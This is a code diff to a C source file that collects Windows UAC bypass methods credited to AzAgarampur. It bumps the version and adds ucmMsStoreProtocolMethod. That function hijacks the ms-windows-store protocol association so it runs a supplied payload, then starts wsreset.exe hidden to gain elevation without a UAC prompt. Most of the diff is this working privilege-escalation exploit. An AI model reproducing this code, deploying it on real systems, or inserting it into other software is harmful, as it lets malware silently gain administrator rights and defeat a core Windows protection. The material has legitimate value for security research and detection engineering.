@@ -1,22 +1,23 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2020
+*  (C) COPYRIGHT AUTHORS, 2020 - 2021
 *
 *  TITLE:       AZAGARAMPUR.C
 *
-*  VERSION:     3.54
+*  VERSION:     3.55
 *
-*  DATE:        26 Dec 2020
+*  DATE:        02 Mar 2021
 *
 *  UAC bypass methods from AzAgarampur.
-* 
+*
 *  For description please visit original URL
-* 
+*
 *  https://github.com/AzAgarampur/byeintegrity-uac
 *  https://github.com/AzAgarampur/byeintegrity2-uac
 *  https://github.com/AzAgarampur/byeintegrity3-uac
 *  https://github.com/AzAgarampur/byeintegrity4-uac
 *  https://github.com/AzAgarampur/byeintegrity-lite
+*  https://github.com/AzAgarampur/byeintegrity7-uac
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -112,7 +113,7 @@ NTSTATUS ucmNICPoisonMethod(
 
     do {
 
-        IsWin7 = (g_ctx->dwBuildNumber < 9200);
+        IsWin7 = (g_ctx->dwBuildNumber < NT_WIN8_RTM);
 
         if (!supInitFusion(IsWin7 ? 2 : 4))
             break;
@@ -957,6 +958,94 @@ NTSTATUS ucmMsSettignsProtocolMethod(
     if (protoGuidString) {
 
         supUnregisterShellAssoc(T_MSSETTINGS,
+            protoGuidString,
+            &SetUserAssoc);
+
+        CoTaskMemFree(protoGuidString);
+    }
+
+    if (SUCCEEDED(hr_init))
+        CoUninitialize();
+
+    return MethodResult;
+}
+
+/*
+* ucmMsStoreProtocolMethod
+*
+* Purpose:
+*
+* Bypass UAC by registering own ms-windows-store protocol.
+*
+*/
+NTSTATUS ucmMsStoreProtocolMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HRESULT hr_init;
+
+    LPOLESTR protoGuidString = NULL;
+    USER_ASSOC_PTR SetUserAssoc;
+    GUID guid;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    RtlSecureZeroMemory(&SetUserAssoc, sizeof(USER_ASSOC_PTR));
+
+    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+
+    do {
+
+        if (CoCreateGuid(&guid) != S_OK)
+            break;
+
+        if (StringFromCLSID(&guid, &protoGuidString) != S_OK)
+            break;
+
+        //
+        // Find UserAssocSet
+        //
+        MethodResult = supFindUserAssocSet(&SetUserAssoc);
+        if (!NT_SUCCESS(MethodResult)) {
+#ifdef _DEBUG
+            ucmShowMessage(FALSE, L"Fail");
+#endif
+            break;
+        }
+
+        //
+        // Register shell protocol.
+        //
+        MethodResult = supRegisterShellAssoc(T_MSWINDOWSSTORE,
+            protoGuidString,
+            &SetUserAssoc,
+            lpszPayload,
+            FALSE);
+
+        if (NT_SUCCESS(MethodResult)) {
+
+            _strcpy(szBuffer, g_ctx->szSystemDirectory);
+            _strcat(szBuffer, WSRESET_EXE);
+
+
+            MethodResult = supRunProcess2(szBuffer, 
+                NULL, 
+                TEXT("open"), 
+                SW_HIDE, 
+                SUPRUNPROCESS_TIMEOUT_DEFAULT) ?
+                STATUS_SUCCESS : STATUS_ACCESS_DENIED;
+
+        }
+
+    } while (FALSE);
+
+    //
+    // Cleanup.
+    //
+    if (protoGuidString) {
+
+        supUnregisterShellAssoc(T_MSWINDOWSSTORE,
             protoGuidString,
             &SetUserAssoc);
 
